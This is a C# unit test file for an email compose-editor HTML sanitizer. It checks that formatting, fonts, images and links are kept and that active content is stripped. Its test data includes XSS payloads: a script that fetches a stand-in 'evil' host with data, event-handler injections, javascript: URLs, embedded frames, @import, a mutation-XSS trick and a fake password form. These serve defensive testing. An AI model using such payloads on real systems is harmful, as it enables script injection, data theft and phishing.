using OpenOutlook.Desktop;

namespace OpenOutlook.Tests;

public sealed class ComposeHtmlTests
{
    private const string OnePixelPng = "data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAQAAAC1HAwCAAAAC0lEQVR42mP8/x8AAwMCAO+/l9sAAAAASUVORK5CYII=";

    private static string Sanitize(string html) => ComposeHtml.Sanitize(html);

    // --- Creation fidelity: the editor must not lose what its own toolbar produces ---

    [Fact]
    public void KeepsTheFontChosenByTheFontPicker()
        // document.execCommand('fontName') emits <font face=...>; dropping it silently discards the
        // user's font choice, which is exactly what the stock profile did.
        => Assert.Contains("face=\"Georgia\"", Sanitize("<p><font face=\"Georgia\" size=\"4\">text</font></p>"));

    [Fact]
    public void KeepsMailtoLinksTheLinkDialogAccepts()
    {
        var result = Sanitize("<a href=\"mailto:someone@example.test?subject=Hi\">email me</a>");
        Assert.Contains("href=\"mailto:someone@example.test", result);
        Assert.DoesNotContain("<a>email me</a>", result);
    }

    [Fact]
    public void KeepsPastedAndInlineImagesExpressedAsDataUris()
    {
        var result = Sanitize($"<p><img src=\"{OnePixelPng}\" alt=\"photo\"></p>");
        Assert.Contains("src=\"data:image/png;base64,", result);
    }

    [Fact]
    public void KeepsRemoteImagesAndOrdinaryLinks()
    {
        var result = Sanitize("<a href=\"https://example.test/a?x=1&amp;y=2\">link</a><img src=\"https://example.test/i.png\" alt=\"i\">");
        Assert.Contains("href=\"https://example.test/a?x=1&amp;y=2\"", result);
        Assert.Contains("src=\"https://example.test/i.png\"", result);
    }

    [Fact]
    public void KeepsTheFormattingVocabularyOfAComposedMessage()
    {
        const string html = "<h2>T</h2><p><b>b</b><i>i</i><u>u</u><s>s</s><sub>sub</sub><sup>sup</sup></p>" +
            "<ul><li>a</li></ul><ol start=\"3\"><li>b</li></ol><blockquote>q</blockquote><pre>p r e</pre>" +
            "<p>a&nbsp;b<br>c</p>";
        var result = Sanitize(html);
        foreach (var fragment in new[] { "<h2>", "<b>", "<i>", "<u>", "<s>", "<sub>", "<sup>", "<ul>", "<li>", "start=\"3\"", "<blockquote>", "<pre>", "<br" })
            Assert.Contains(fragment, result);
    }

    [Fact]
    public void KeepsTableLayoutAttributesUsedBySignatures()
    {
        var result = Sanitize("<table width=\"300\" cellpadding=\"4\" cellspacing=\"0\" bgcolor=\"#eeeeee\">" +
            "<tr><td colspan=\"2\" valign=\"top\" style=\"border:1px solid #ccc\">c</td></tr></table>");
        // The shorthand is re-serialized with the colour expanded, so #ccc arrives as #cccccc.
        foreach (var fragment in new[] { "width=\"300\"", "cellpadding=\"4\"", "bgcolor=\"#eeeeee\"",
            "colspan=\"2\"", "valign=\"top\"", "border:1pxsolid#cccccc" })
            Assert.Contains(fragment, result.Replace(" ", ""));
    }

    [Fact]
    public void WritesColoursAsHexBecauseOutlookIgnoresRgba()
    {
        var result = Sanitize("<span style=\"color:#ff0000;background-color:#ffff99\">x</span>");
        Assert.Contains("color:#ff0000", result.Replace(" ", ""));
        Assert.Contains("background-color:#ffff99", result.Replace(" ", ""));
        Assert.DoesNotContain("rgba(", result, StringComparison.OrdinalIgnoreCase);
    }

    [Fact]
    public void LeavesGenuinelyTransparentColoursAloneRatherThanGuessing()
        // Flattening alpha onto an unknown background would change the colour the user picked.
        => Assert.Contains("rgba(255, 0, 0, 0.5)", Sanitize("<span style=\"color:rgba(255,0,0,0.5)\">x</span>"), StringComparison.OrdinalIgnoreCase);

    // --- Active content must not reach the message the recipient gets ---

    [Theory]
    [InlineData("<p>hi</p><script>fetch('//evil?d='+1)</script>", "evil")]
    [InlineData("<img src=x onerror=\"postMessage('apply')\">", "onerror")]
    [InlineData("<body onload=\"alert(1)\">t</body>", "onload")]
    [InlineData("<a href=\"javascript:alert(1)\">c</a>", "javascript:")]
    [InlineData("<svg><script>alert(1)</script></svg>", "<script")]
    [InlineData("<iframe src=\"https://evil.test\"></iframe>", "iframe")]
    [InlineData("<object data=\"https://evil.test/x\"></object>", "object")]
    [InlineData("<embed src=\"https://evil.test/x\">", "embed")]
    [InlineData("<base href=\"https://evil.test/\">", "base")]
    [InlineData("<meta http-equiv=\"refresh\" content=\"0;url=https://evil.test\">", "refresh")]
    [InlineData("<link rel=stylesheet href=\"https://evil.test/c.css\">", "evil.test")]
    [InlineData("<style>@import url('//evil.test/x');</style>", "evil.test")]
    [InlineData("<noscript><p><style><!--</style><img src=x onerror=alert(1)></noscript>", "onerror")]
    public void RemovesActiveContent(string html, string forbidden)
        => Assert.DoesNotContain(forbidden, Sanitize(html), StringComparison.OrdinalIgnoreCase);

    [Fact]
    public void RemovesFormControlsThatCouldFakeACredentialPrompt()
    {
        var result = Sanitize("<form action=\"https://evil.test\"><input name=password><button>Sign in</button></form>");
        Assert.DoesNotContain("<form", result, StringComparison.OrdinalIgnoreCase);
        Assert.DoesNotContain("<input", result, StringComparison.OrdinalIgnoreCase);
        Assert.DoesNotContain("<button", result, StringComparison.OrdinalIgnoreCase);
    }

    [Fact]
    public void DropsDataUrisThatAreNotImages()
    {
        var result = Sanitize("<a href=\"data:text/html,<script>alert(1)</script>\">x</a>");
        Assert.DoesNotContain("data:text/html", result, StringComparison.OrdinalIgnoreCase);
        Assert.Contains(">x</a>", result);
    }

    [Fact]
    public void DropsOversizedDataUris()
    {
        var huge = "data:image/png;base64," + new string('A', 5 * 1024 * 1024);
        Assert.DoesNotContain("data:image/png", Sanitize($"<img src=\"{huge}\">"), StringComparison.OrdinalIgnoreCase);
    }

    // --- The editor sanitizes on the way in and again on Apply, so a second pass must be inert ---

    [Fact]
    public void IsIdempotentBecauseItRunsOnInputAndAgainOnApply()
    {
        const string html = "<p style=\"color:#343463\"><font face=Arial size=4>Hi <b>there</b></font></p>" +
            $"<img src=\"{OnePixelPng}\"><a href=\"mailto:a@b.test\">m</a><table><tr><td background=x>1</td></tr></table>";
        var once = Sanitize(html);
        Assert.Equal(once, Sanitize(once));
    }

    [Fact]
    public void HandlesEmptyAndPlainTextInput()
    {
        Assert.Equal("", Sanitize(""));
        Assert.Equal("plain text", Sanitize("plain text"));
    }
}
